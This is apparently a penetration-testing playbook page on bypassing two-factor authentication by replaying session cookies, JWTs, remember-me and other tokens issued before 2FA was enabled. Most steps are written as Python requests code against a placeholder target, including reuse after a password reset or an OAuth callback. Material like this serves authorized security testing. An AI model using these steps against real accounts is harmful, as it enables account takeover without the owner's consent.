# 2FA — Old Session / Pre-2FA Token Reuse

## When this applies

- A user enables 2FA AFTER their initial login.
- The application does not invalidate existing sessions when 2FA is enabled.
- Old session cookies remain valid and bypass the 2FA enforcement.

## Technique

Capture an authenticated session before 2FA is enabled. After 2FA is added to the account, replay the old session cookie. If the application doesn't invalidate pre-2FA sessions on the upgrade, the old cookie continues to grant full access — bypassing 2FA.

## Steps

### 1. Login before 2FA is enabled

```python
import requests
session = requests.Session()
session.post('https://target.com/login', data={'username':'test','password':'test123'})
old_cookies = session.cookies.get_dict()    # Save cookies
```

### 2. User enables 2FA

Either user-driven (legitimate) or attacker-driven (e.g. via account-takeover scenario):

```python
session.post('https://target.com/account/enable_2fa')
```

### 3. New session would require 2FA

A NEW login attempt now requires OTP:

```python
new_session = requests.Session()
r = new_session.post('https://target.com/login', data={'username':'test','password':'test123'})
# r.json() → {"mfa_required": true}
```

### 4. Replay old session cookie

```python
replay = requests.Session()
replay.cookies.update(old_cookies)
r = replay.get('https://target.com/dashboard')
# 200 = old session still valid → bypass
```

### 5. Test other persistent state

Beyond cookies, look for:
- localStorage / sessionStorage tokens.
- Mobile app refresh tokens.
- API keys generated before 2FA enrollment.
- Remember-me cookies.

```python
# JWT in localStorage
old_jwt = "eyJ..."
requests.get('https://target.com/api/me',
             headers={'Authorization': f'Bearer {old_jwt}'})
```

### 6. Test password reset flows

Sometimes password reset issues a new "logged-in" session that doesn't enforce 2FA:

```python
# Reset password (requires email access)
reset_token = get_reset_token_from_email()
requests.post('https://target.com/reset_password',
              json={'token':reset_token,'password':'new'})
# Server may auto-login without 2FA
```

### 7. Test OAuth callback re-issue

If the app supports OAuth login and OAuth identity is established:

```python
# Trigger OAuth re-login → may issue new session without 2FA
trigger_oauth_callback()
```

### 8. Test "Remember me" / long-lived tokens

```python
# Long-lived cookie set during initial password login
remember_cookie = "remember=long_lived_token"
requests.get('https://target.com/dashboard',
             cookies={'remember': remember_cookie})
```

## Verifying success

- Old session cookie returns 200 from protected endpoints.
- New login attempts on the same account require 2FA.
- The user's account still has 2FA enabled (verify in account settings).

## Common pitfalls

- Modern apps invalidate ALL sessions on 2FA enable / password change.
- Some apps have a separate "session version" field in the user record — incrementing it invalidates all old sessions.
- Mobile app tokens may have separate lifecycle from web sessions.
- Audit logs flag replay of old cookies on 2FA-protected accounts — note for engagement timeline.

## Tools

- Burp Suite (cookie capture and replay).
- Custom Python with persistent cookies.
- Browser DevTools (manual cookie injection).
